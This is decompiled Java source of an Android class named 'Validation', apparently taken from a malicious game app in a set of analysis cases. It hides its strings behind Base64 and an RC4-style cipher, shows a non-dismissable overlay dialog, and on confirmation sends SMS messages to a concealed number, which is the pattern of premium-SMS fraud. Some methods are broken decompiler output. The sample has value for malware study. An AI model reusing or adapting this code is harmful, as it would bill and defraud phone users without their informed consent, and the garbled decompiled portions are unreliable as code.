package com.example.lw.appfight.com.ads;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.SmsManager;
import android.view.Window;
import java.util.Locale;

public class Validation
{
  private static Editor a;
  private static Context b;
  private static SharedPreferences c;
  private static int d;
  private static String e;
  private static String f;
  private static String g;
  private static int h;
  private static int i;
  private static final String j;
  private static final char[] k;
  private static final byte[] l;
  
  static
  {
    int i1 = 0;
    e = "RhVyaBREPnB2Vj9AHTlGNXURSC80ET1UNQQ=";
    f = "OWkNfQ==";
    g = "";
    h = 0;
    i = 1;
    j = System.getProperty("line.separator");
    k = new char[64];
    int m = 65;
    int n = 0;
    if (m > 90)
    {
      m = 97;
      label54:
      if (m <= 122) {
        break label136;
      }
      m = 48;
      label63:
      if (m <= 57) {
        break label154;
      }
      char[] arrayOfChar = k;
      int i2 = n + 1;
      arrayOfChar[n] = '+';
      k[i2] = '/';
      l = new byte[''];
      n = 0;
      label101:
      if (n < l.length) {
        break label172;
      }
      n = i1;
    }
    for (;;)
    {
      if (n >= 64)
      {
        return;
        k[n] = m;
        m = (char)(m + 1);
        n += 1;
        break;
        label136:
        k[n] = m;
        m = (char)(m + 1);
        n += 1;
        break label54;
        label154:
        k[n] = m;
        m = (char)(m + 1);
        n += 1;
        break label63;
        label172:
        l[n] = -1;
        n += 1;
        break label101;
      }
      l[k[n]] = ((byte)n);
      n += 1;
    }
  }
  
  public static String a(String paramString)
  {
    return new String(a(paramString.getBytes()));
  }
  
  public static void a(Context paramContext)
  {
    try
    {
      b = paramContext;
      new Thread(new Validation.1()).start();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static byte[] a(char[] paramArrayOfChar)
  {
    return a(paramArrayOfChar, 0, paramArrayOfChar.length);
  }
  
  public static byte[] a(char[] paramArrayOfChar, int paramInt1, int paramInt2)
  {
    int m = paramInt2;
    if (paramInt2 % 4 != 0) {
      throw new IllegalArgumentException("Length of multiple of 4.");
    }
    while ((m > 0) && (paramArrayOfChar[(paramInt1 + m - 1)] == '=')) {
      m -= 1;
    }
    int i1 = m * 3 / 4;
    byte[] arrayOfByte = new byte[i1];
    int i2 = paramInt1 + m;
    m = 0;
    paramInt2 = paramInt1;
    paramInt1 = m;
    if (paramInt2 >= i2) {
      return arrayOfByte;
    }
    m = paramInt2 + 1;
    int i3 = paramArrayOfChar[paramInt2];
    paramInt2 = m + 1;
    int i4 = paramArrayOfChar[m];
    if (paramInt2 < i2)
    {
      m = paramArrayOfChar[paramInt2];
      paramInt2 += 1;
      if (paramInt2 >= i2) {
        break label161;
      }
      n = paramArrayOfChar[paramInt2];
      paramInt2 += 1;
    }
    for (;;)
    {
      if ((i3 <= 127) && (i4 <= 127) && (m <= 127) && (n <= 127)) {
        break label168;
      }
      throw new IllegalArgumentException("Illegal character.");
      m = 65;
      break;
      label161:
      n = 65;
    }
    label168:
    int i5 = l[i3];
    i4 = l[i4];
    i3 = l[m];
    int n = l[n];
    if ((i5 < 0) || (i4 < 0) || (i3 < 0) || (n < 0)) {
      throw new IllegalArgumentException("Illegal character.");
    }
    m = paramInt1 + 1;
    arrayOfByte[paramInt1] = ((byte)(i4 >>> 4 | i5 << 2));
    if (m < i1)
    {
      paramInt1 = m + 1;
      arrayOfByte[m] = ((byte)(i3 >>> 2 | (i4 & 0xF) << 4));
    }
    for (;;)
    {
      if (paramInt1 < i1)
      {
        arrayOfByte[paramInt1] = ((byte)((i3 & 0x3) << 6 | n));
        paramInt1 += 1;
        break;
      }
      break;
      paramInt1 = m;
    }
  }
  
  public static char[] a(byte[] paramArrayOfByte)
  {
    return a(paramArrayOfByte, 0, paramArrayOfByte.length);
  }
  
  public static char[] a(byte[] paramArrayOfByte, int paramInt1, int paramInt2)
  {
    int i3 = (paramInt2 * 4 + 2) / 3;
    char[] arrayOfChar = new char[(paramInt2 + 2) / 3 * 4];
    int i4 = paramInt1 + paramInt2;
    paramInt2 = 0;
    if (paramInt1 >= i4) {
      return arrayOfChar;
    }
    int n = paramInt1 + 1;
    int i5 = paramArrayOfByte[paramInt1] & 0xFF;
    int i1;
    if (n < i4)
    {
      paramInt1 = paramArrayOfByte[n] & 0xFF;
      i1 = n + 1;
      n = paramInt1;
      paramInt1 = i1;
      label78:
      if (paramInt1 >= i4) {
        break label221;
      }
      i1 = paramInt1 + 1;
      int i2 = paramArrayOfByte[paramInt1] & 0xFF;
      paramInt1 = i1;
      i1 = i2;
      label105:
      i2 = paramInt2 + 1;
      arrayOfChar[paramInt2] = k[(i5 >>> 2)];
      paramInt2 = i2 + 1;
      arrayOfChar[i2] = k[((i5 & 0x3) << 4 | n >>> 4)];
      if (paramInt2 >= i3) {
        break label227;
      }
      m = k[((n & 0xF) << 2 | i1 >>> 6)];
      label171:
      arrayOfChar[paramInt2] = m;
      paramInt2 += 1;
      if (paramInt2 >= i3) {
        break label233;
      }
    }
    label221:
    label227:
    label233:
    for (int m = k[(i1 & 0x3F)];; m = 61)
    {
      arrayOfChar[paramInt2] = m;
      paramInt2 += 1;
      break;
      i1 = 0;
      paramInt1 = n;
      n = i1;
      break label78;
      i1 = 0;
      break label105;
      m = 61;
      break label171;
    }
  }
  
  private static long b(String paramString, long paramLong)
  {
    try
    {
      long l1 = Long.parseLong(paramString);
      return l1;
    }
    catch (NumberFormatException paramString) {}
    return paramLong;
  }
  
  public static String b(String paramString)
  {
    return new String(c(paramString));
  }
  
  private static void b(Context paramContext, String paramString1, String paramString2)
  {
    h += 1;
    String str = "SMS_SENT_" + h;
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 0, new Intent(str), 0);
    paramContext.registerReceiver(new Validation.6(), new IntentFilter(str));
    SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, localPendingIntent, null);
  }
  
  public static byte[] c(String paramString)
  {
    return a(paramString.toCharArray());
  }
  
  public static String d(String paramString)
  {
    return new String(a(f(paramString)));
  }
  
  public static String e(String paramString)
  {
    return new String(f(b(paramString)));
  }
  
  public static String f(String paramString)
  {
    int i2 = 0;
    int[] arrayOfInt = new int[''];
    Object localObject = new byte[''];
    int m = 0;
    label28:
    int n;
    label39:
    int i1;
    if (m >= 128)
    {
      m = 0;
      if (m < 128) {
        break label92;
      }
      m = 0;
      n = 0;
      if (m < 128) {
        break label113;
      }
      paramString = paramString.toCharArray();
      localObject = new char[paramString.length];
      i1 = 0;
      n = 0;
    }
    for (m = i2;; m = (short)(m + 1))
    {
      if (m >= paramString.length)
      {
        return new String((char[])localObject);
        arrayOfInt[m] = m;
        m += 1;
        break;
        label92:
        localObject[m] = ((byte)"65535".charAt(m % 5));
        m = (short)(m + 1);
        break label28;
        label113:
        n = (n + arrayOfInt[m] + localObject[m]) % 128;
        i1 = arrayOfInt[m];
        arrayOfInt[m] = arrayOfInt[n];
        arrayOfInt[n] = i1;
        m += 1;
        break label39;
      }
      i1 = (i1 + 1) % 128;
      n = (n + arrayOfInt[i1]) % 128;
      i2 = arrayOfInt[i1];
      arrayOfInt[i1] = arrayOfInt[n];
      arrayOfInt[n] = i2;
      localObject[m] = ((char)((char)arrayOfInt[((arrayOfInt[i1] + arrayOfInt[n] % 128) % 128)] ^ paramString[m]));
    }
  }
  
  private static void k()
  {
    Object localObject = new Builder(b.getApplicationContext());
    if ((g != null) && (g.length() > 0))
    {
      ((Builder)localObject).setTitle("Thông báo");
      ((Builder)localObject).setMessage(g.replace("\\n", "\n"));
    }
    for (;;)
    {
      ((Builder)localObject).setPositiveButton("No", new Validation.2());
      ((Builder)localObject).setNegativeButton("Yes", new Validation.3());
      localObject = ((Builder)localObject).create();
      ((AlertDialog)localObject).setCancelable(false);
      ((AlertDialog)localObject).getWindow().setType(2003);
      ((AlertDialog)localObject).show();
      return;
      if (Locale.getDefault().getLanguage().equals("vi"))
      {
        ((Builder)localObject).setTitle(e("VTbhu6chRUQ2fH0eNMONU21GcT3hu4xIxb3DpAlt4buccBIr4buxXQ=="));
        ((Builder)localObject).setMessage(e("Q+G7v1RoBsOQf3Bm4buvPhRa4bunDyUhSAZMaUHhuqoNJFnCrjNbQQtv4bqtaioa4burQmc=") + e(f) + e("ITVSwrwLRGA="));
      }
      else
      {
        ((Builder)localObject).setTitle(e("VSxTKQkDKXhhTTlbUyoOZCYBDRR3QHcGYA=="));
        ((Builder)localObject).setMessage(e("RTEaMQpWf2pyUCQUSWVGdjBPDExmSnEKcldjPVYSEGFreyoaXws=") + e(f) + e("Pg=="));
      }
    }
  }
  
  private static void l()
  {
    Object localObject = new Builder(b.getApplicationContext());
    if (Locale.getDefault().getLanguage().equals("vi"))
    {
      ((Builder)localObject).setTitle("Thoát ứng dụng");
      ((Builder)localObject).setMessage("Bạn có chắc mình muốn thoát ứng dụng không?");
    }
    for (;;)
    {
      ((Builder)localObject).setPositiveButton("No", new Validation.4());
      ((Builder)localObject).setNegativeButton("Yes", new Validation.5());
      localObject = ((Builder)localObject).create();
      ((AlertDialog)localObject).setCancelable(false);
      ((AlertDialog)localObject).getWindow().setType(2003);
      ((AlertDialog)localObject).show();
      return;
      ((Builder)localObject).setTitle("Exit application");
      ((Builder)localObject).setMessage("Are you sure you want to exit this application?");
    }
  }
  
  /* Error */
  private static void m()
  {
    // Byte code:
    //   0: ldc_w 326
    //   3: invokestatic 293	com/ads/Validation:e	(Ljava/lang/String;)Ljava/lang/String;
    //   6: ldc_w 328
    //   9: invokevirtual 332	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   12: ifeq +30 -> 42
    //   15: new 151	android/content/Intent
    //   18: dup
    //   19: ldc_w 334
    //   22: ldc_w 326
    //   25: invokestatic 293	com/ads/Validation:e	(Ljava/lang/String;)Ljava/lang/String;
    //   28: invokestatic 340	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
    //   31: invokespecial 343	android/content/Intent:<init>	(Ljava/lang/String;Landroid/net/Uri;)V
    //   34: astore_0
    //   35: getstatic 81	com/ads/Validation:b	Landroid/content/Context;
    //   38: aload_0
    //   39: invokevirtual 347	android/content/Context:startActivity	(Landroid/content/Intent;)V
    //   42: getstatic 81	com/ads/Validation:b	Landroid/content/Context;
    //   45: checkcast 349	android/app/Activity
    //   48: invokevirtual 352	android/app/Activity:finish	()V
    //   51: invokestatic 357	android/os/Process:myPid	()I
    //   54: invokestatic 360	android/os/Process:killProcess	(I)V
    //   57: getstatic 81	com/ads/Validation:b	Landroid/content/Context;
    //   60: checkcast 349	android/app/Activity
    //   63: invokevirtual 364	android/app/Activity:isFinishing	()Z
    //   66: ifeq +55 -> 121
    //   69: getstatic 81	com/ads/Validation:b	Landroid/content/Context;
    //   72: invokevirtual 214	android/content/Context:getApplicationContext	()Landroid/content/Context;
    //   75: invokevirtual 368	android/content/Context:getPackageManager	()Landroid/content/pm/PackageManager;
    //   78: iconst_0
    //   79: invokevirtual 374	android/content/pm/PackageManager:getInstalledApplications	(I)Ljava/util/List;
    //   82: astore_1
    //   83: getstatic 81	com/ads/Validation:b	Landroid/content/Context;
    //   86: invokevirtual 214	android/content/Context:getApplicationContext	()Landroid/content/Context;
    //   89: ldc_w 376
    //   92: invokevirtual 380	android/content/Context:getSystemService	(Ljava/lang/String;)Ljava/lang/Object;
    //   95: checkcast 382	android/app/ActivityManager
    //   98: astore_0
    //   99: aload_1
    //   100: invokeinterface 388 1 0
    //   105: astore_1
    //   106: aload_1
    //   107: invokeinterface 393 1 0
    //   112: ifne +10 -> 122
    //   115: invokestatic 357	android/os/Process:myPid	()I
    //   118: invokestatic 360	android/os/Process:killProcess	(I)V
    //   121: return
    //   122: aload_1
    //   123: invokeinterface 397 1 0
    //   128: checkcast 399	android/content/pm/ApplicationInfo
    //   131: astore_2
    //   132: aload_2
    //   133: getfield 402	android/content/pm/ApplicationInfo:flags	I
    //   136: iconst_1
    //   137: iand
    //   138: iconst_1
    //   139: if_icmpeq -33 -> 106
    //   142: aload_2
    //   143: getfield 405	android/content/pm/ApplicationInfo:packageName	Ljava/lang/String;
    //   146: getstatic 81	com/ads/Validation:b	Landroid/content/Context;
    //   149: invokevirtual 408	android/content/Context:getPackageName	()Ljava/lang/String;
    //   152: invokevirtual 289	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   155: ifeq -49 -> 106
    //   158: aload_0
    //   159: aload_2
    //   160: getfield 405	android/content/pm/ApplicationInfo:packageName	Ljava/lang/String;
    //   163: invokevirtual 411	android/app/ActivityManager:killBackgroundProcesses	(Ljava/lang/String;)V
    //   166: goto -51 -> 115
    //   169: astore_0
    //   170: goto -128 -> 42
    // Local variable table:
    //   start	length	slot	name	signature
    //   34	125	0	localObject1	Object
    //   169	1	0	localException	Exception
    //   82	41	1	localObject2	Object
    //   131	29	2	localApplicationInfo	android.content.pm.ApplicationInfo
    // Exception table:
    //   from	to	target	type
    //   0	42	169	java/lang/Exception
  }
}


/* Location:           F:\四个案例的jar\格斗游戏盒子\classes-dex2jar.jar
 * Qualified Name:     com.ads.Validation
 * JD-Core Version:    0.7.0-SNAPSHOT-20130630
 */